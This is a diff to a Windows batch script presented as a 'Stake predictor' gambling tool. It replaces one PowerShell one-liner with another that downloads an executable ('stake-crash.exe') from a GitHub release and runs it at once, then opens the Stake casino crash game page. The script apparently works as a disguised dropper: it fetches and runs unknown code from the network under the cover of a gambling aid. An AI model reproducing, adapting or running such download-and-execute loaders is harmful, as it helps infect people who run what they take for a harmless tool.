@@ -8,6 +8,6 @@ echo.
 echo Coded By https://github.com/IW-CommunityXStake-Predictor
 echo.
 
-powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Predictor-IW/Stake-mines-predictor/releases/download/Stake-mines/stake-mines.exe';$file='stake-mines.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IW-CommunityXStake-Predictor/Stake-Crash-Predictor/releases/download/Crash-Predictor/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 
 start https://stake.com/fr/casino/games/crash
